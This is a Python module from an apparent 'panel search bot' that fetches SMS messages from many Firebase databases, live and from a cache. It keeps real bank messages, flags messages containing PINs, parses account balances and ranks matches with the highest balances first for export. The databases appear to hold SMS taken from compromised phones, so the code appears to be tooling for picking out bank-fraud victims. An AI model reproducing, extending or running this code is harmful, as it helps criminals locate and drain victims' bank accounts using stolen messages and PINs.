from __future__ import annotations

import asyncio
import time
from dataclasses import dataclass, field
from datetime import datetime, timedelta

from sqlalchemy.orm import Session

from panel_search_bot.firebase_fetch import fetch_many
from panel_search_bot.models import FirebaseDb
from panel_search_bot.config import get_settings
from panel_search_bot.services import (
    firebase_ids_with_cached_sms,
    iter_cached_sms_for_search,
    match_keywords,
    update_firebase_status,
    upsert_cached_sms,
    wants_bank_filter,
    within_days,
)
from panel_search_bot.sms_parser import is_real_bank_sms, is_spam_sms, parse_balance


@dataclass
class SearchParams:
    keywords: list[str]
    mode: str = "online"  # online | offline | both
    balance_sort: str = "high"  # high | low | skip
    days: int | None = None  # None = all time
    pin_filter: str = "both"  # with | without | both


@dataclass
class SearchMatch:
    firebase_url: str
    sender: str
    body: str
    message_at: datetime | None
    balance: float | None
    has_pin: bool
    source: str  # live | cache
    device_id: str = "unknown"
    db_label: str = ""


@dataclass
class SearchResult:
    matches: list[SearchMatch] = field(default_factory=list)
    dbs_scanned: int = 0
    dbs_online: int = 0
    elapsed_sec: float = 0.0


def _pin_ok(has_pin: bool, pin_filter: str) -> bool:
    if pin_filter == "both":
        return True
    if pin_filter == "with":
        return has_pin
    return not has_pin


def _sort_matches(matches: list[SearchMatch], balance_sort: str) -> list[SearchMatch]:
    if balance_sort == "skip":
        return sorted(matches, key=lambda m: m.message_at or datetime.min, reverse=True)
    reverse = balance_sort == "high"

    def key(m: SearchMatch):
        bal = m.balance if m.balance is not None else (-1 if reverse else 1e18)
        return (bal, m.message_at or datetime.min)

    return sorted(matches, key=key, reverse=reverse)


def _balance_in_range(balance: float | None, balance_sort: str) -> bool:
    if balance_sort == "skip":
        return True
    if balance is None:
        return False
    settings = get_settings()
    if balance_sort == "high":
        return settings.panel_search_balance_high_min <= balance <= settings.panel_search_balance_high_max
    if balance_sort == "low":
        return balance >= settings.panel_search_balance_low_min
    return True


def _filter_row(
    sender: str,
    body: str,
    message_at: datetime | None,
    balance: float | None,
    has_pin: bool,
    params: SearchParams,
) -> bool:
    if is_spam_sms(body, sender):
        return False
    blob = f"{sender} {body}"
    if not match_keywords(blob, params.keywords):
        return False
    if wants_bank_filter(params.keywords) and not is_real_bank_sms(body, sender):
        return False
    if not _pin_ok(has_pin, params.pin_filter):
        return False
    if not within_days(message_at, params.days):
        return False
    effective_balance = balance if balance is not None else parse_balance(body)
    if not _balance_in_range(effective_balance, params.balance_sort):
        return False
    return True


def format_result_file(
    matches: list[SearchMatch],
    params: SearchParams,
    *,
    elapsed_sec: float = 0.0,
    dbs_scanned: int = 0,
) -> str:
    from panel_search_bot.export_format import format_astik_result_file

    return format_astik_result_file(
        matches,
        params,
        elapsed_sec=elapsed_sec,
        dbs_scanned=dbs_scanned,
    )


async def run_search(
    db: Session,
    firebase_rows: list[FirebaseDb],
    params: SearchParams,
    *,
    cancel_event: asyncio.Event | None = None,
    on_progress=None,
) -> SearchResult:
    started = time.time()
    matches: list[SearchMatch] = []
    url_to_row = {row.url_normalized: row for row in firebase_rows}
    urls = list(url_to_row.keys())
    result = SearchResult()

    ids = [row.id for row in firebase_rows]
    id_to_url = {row.id: row.url_normalized for row in firebase_rows}

    if params.mode in ("offline", "both", "online"):
        if params.mode == "offline":
            result.dbs_scanned = len(firebase_rows)
        if on_progress:
            await on_progress(0, len(urls), "cache", True, 0, "cache SQL scan…", 0)
        for row in iter_cached_sms_for_search(
            db,
            ids,
            keywords=params.keywords,
            balance_sort=params.balance_sort,
        ):
            url = id_to_url.get(row.firebase_db_id, "unknown")
            from panel_search_bot.export_format import match_from_cache_row

            probe = match_from_cache_row(url, row)
            if _filter_row(
                probe.sender,
                probe.body,
                probe.message_at,
                probe.balance,
                probe.has_pin,
                params,
            ):
                matches.append(probe)

    if params.mode in ("online", "both") and urls and get_settings().panel_search_live_fetch:
        settings = get_settings()
        cached_ids = firebase_ids_with_cached_sms(db, ids)
        skip_urls: set[str] = set()
        offline_cutoff = datetime.utcnow() - timedelta(hours=settings.panel_search_skip_offline_hours)
        if settings.panel_search_skip_live_if_cached:
            for row in firebase_rows:
                if row.id in cached_ids:
                    skip_urls.add(row.url_normalized)
        for row in firebase_rows:
            if row.is_online is False and row.last_checked_at and row.last_checked_at >= offline_cutoff:
                skip_urls.add(row.url_normalized)

        status_updates: list[tuple[int, bool]] = []
        pending_writes: list[tuple] = []

        raw_fetched = {"n": 0}

        async def progress(done, total, url, online, sms_count, resolved):
            raw_fetched["n"] += sms_count
            row = url_to_row.get(url)
            if row and url not in skip_urls:
                status_updates.append((row.id, online))
            if on_progress:
                await on_progress(
                    done,
                    total,
                    url,
                    online,
                    sms_count,
                    resolved,
                    raw_fetched["n"],
                )

        live = await fetch_many(
            urls,
            on_progress=progress,
            cancel_event=cancel_event,
            skip_urls=skip_urls,
            progress_total=len(urls),
        )
        for fb_id, online in status_updates:
            update_firebase_status(db, fb_id, online)
        result.dbs_scanned = len(urls)
        for url, (online, sms_list, _resolved) in live.items():
            if url in skip_urls:
                result.dbs_online += 1
                continue
            if online:
                result.dbs_online += 1
            row = url_to_row[url]
            if online and sms_list:
                if settings.panel_search_defer_cache_write:
                    pending_writes.append((row.id, row.url_normalized, sms_list))
                else:
                    upsert_cached_sms(db, row.id, row.url_normalized, sms_list)
            for item in sms_list:
                from panel_search_bot.export_format import match_from_live_item

                probe = match_from_live_item(url, item)
                if _filter_row(
                    probe.sender,
                    probe.body,
                    probe.message_at,
                    probe.balance,
                    probe.has_pin,
                    params,
                ):
                    matches.append(probe)
        if settings.panel_search_defer_cache_write:
            for fb_id, device_key, sms_list in pending_writes:
                upsert_cached_sms(db, fb_id, device_key, sms_list)

    seen: set[tuple] = set()
    unique: list[SearchMatch] = []
    for m in matches:
        key = (m.firebase_url, m.body[:200], m.message_at)
        if key in seen:
            continue
        seen.add(key)
        unique.append(m)
    matches = unique

    result.matches = _sort_matches(matches, params.balance_sort)
    result.elapsed_sec = time.time() - started
    return result
